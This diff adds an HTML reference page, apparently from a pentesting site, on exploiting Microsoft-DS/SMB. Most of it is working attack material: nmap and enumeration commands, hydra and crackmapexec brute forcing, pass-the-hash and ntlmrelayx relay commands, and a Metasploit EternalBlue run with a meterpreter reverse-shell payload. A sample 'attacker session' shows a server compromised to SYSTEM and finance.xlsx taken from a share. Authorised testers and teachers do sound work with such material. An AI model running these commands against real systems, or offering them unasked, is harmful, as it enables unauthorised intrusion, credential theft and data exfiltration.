@@ -1,0 +1,208 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">Microsoft-DS (SMB) Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Windows Networking</strong> • Focus: <strong>SMB Abuse & Microsoft-DS Exploitation</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Microsoft-DS (TCP/445) underpins SMB (Server Message Block), a protocol used 
+    for file sharing, printer access, and Active Directory operations. 
+    Exposed SMB services are prime targets for attackers: exploiting vulnerabilities 
+    (EternalBlue, SMBGhost), abusing weak/null sessions, stealing credentials 
+    via NTLM relays, and exfiltrating sensitive files. SMB exploitation is 
+    critical in Red Team and APT campaigns, often used for lateral movement, 
+    persistence, and full domain compromise.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Legacy Support:</strong> SMBv1 is still found, vulnerable to EternalBlue (MS17-010).</li>
+    <li><strong>Null/Guest Sessions:</strong> Misconfigured SMB allows anonymous access.</li>
+    <li><strong>Weak Credentials:</strong> SMB logins often brute-forced or reused.</li>
+    <li><strong>Relay Attacks:</strong> NTLM relay enables authentication hijacking.</li>
+    <li><strong>Widespread Use:</strong> Core protocol for AD, making it an ideal pivot point.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify open TCP/445 services.</li>
+    <li><strong>Enumeration:</strong> List shares, users, and permissions.</li>
+    <li><strong>Exploitation:</strong> Abuse null sessions, brute force, or vulnerabilities (EternalBlue, SMBGhost).</li>
+    <li><strong>Credential Theft:</strong> Capture NTLM hashes via SMB relay or LLMNR poisoning.</li>
+    <li><strong>Impact:</strong> Remote code execution, lateral movement, domain takeover.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan and detect Microsoft-DS (TCP/445).</li>
+    <li>Enumerate SMB shares and users.</li>
+    <li>Test for guest/null sessions.</li>
+    <li>Brute force or pass-the-hash login attempts.</li>
+    <li>Exploit known vulnerabilities (e.g., EternalBlue).</li>
+    <li>Exfiltrate data or pivot inside the network.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p445 --script smb-os-discovery [target]
+nmap --script smb-vuln* -p445 [target]
+
+# ------------------------------
+# Enumeration
+# ------------------------------
+smbclient -L //[target]/ -N                   # List shares (null session)
+smbmap -H [target]                            # Enumerate shares & perms
+enum4linux -a [target]                        # User/share/domain enum
+
+# ------------------------------
+# Authentication Attacks
+# ------------------------------
+hydra -L users.txt -P passwords.txt smb://[target]
+crackmapexec smb [target] -u users.txt -p passwords.txt --shares
+
+# ------------------------------
+# Exploiting EternalBlue
+# ------------------------------
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST [target]
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run
+
+# ------------------------------
+# Pass-the-Hash / NTLM Relay
+# ------------------------------
+impacket-smbclient -hashes [LM:NT] [user]@[target]
+ntlmrelayx.py -tf targets.txt -smb2support
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p445 --script smb-vuln* 192.168.1.50
+smbmap -H 192.168.1.50
+smbclient //192.168.1.50/Share -U admin
+    </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p445 --script smb-vuln* 192.168.1.50
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+| smb-vuln-ms17-010: VULNERABLE
+|   MS17-010: EternalBlue
+|   Security update KB4012598 not installed
+
+[ saide ~ ]$ smbmap -H 192.168.1.50
+[+] IP: 192.168.1.50:445   Name: WIN-SERVER
+    Share     Permissions
+    -----     -----------
+    ADMIN$    READ, WRITE
+    C$        READ, WRITE
+    Public    READ
+
+[ saide ~ ]$ smbclient //192.168.1.50/Public -N
+smb: \> get finance.xlsx
+smb: \> exit
+
+[ saide ~ ]$ msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST 192.168.1.50
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run
+
+[*] Started reverse TCP handler
+[*] Exploit completed, session 1 opened
+
+meterpreter > sysinfo
+Computer    : WIN-SERVER
+OS          : Windows Server 2012 R2
+Architecture: x64
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample Microsoft-DS exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+445/tcp open  microsoft-ds
+
+# Vulnerability Detection
+MS17-010 (EternalBlue) → VULNERABLE
+
+# Share Enumeration
+ADMIN$ → READ/WRITE
+C$ → READ/WRITE
+Public → READ
+
+# Exploitation
+Remote code execution via EternalBlue → Meterpreter shell
+Exfiltrated finance.xlsx from Public share
+
+# Proof of Exploitation
+Windows Server 2012 R2 compromised with SYSTEM access
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting SMB
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1021/002/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – SMB/Windows Admin Shares
+      </a>
+    </li>
+    <li>
+      <a href="https://msrc.microsoft.com/update-guide/vulnerability/MS17-010" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MSRC – MS17-010 EternalBlue
+      </a>
+    </li>
+    <li>Red Team workflow: Discovery → Share enum → Null session → Cred abuse → Exploit vuln → Pivot to domain takeover.</li>
+  </ul>
+</section>
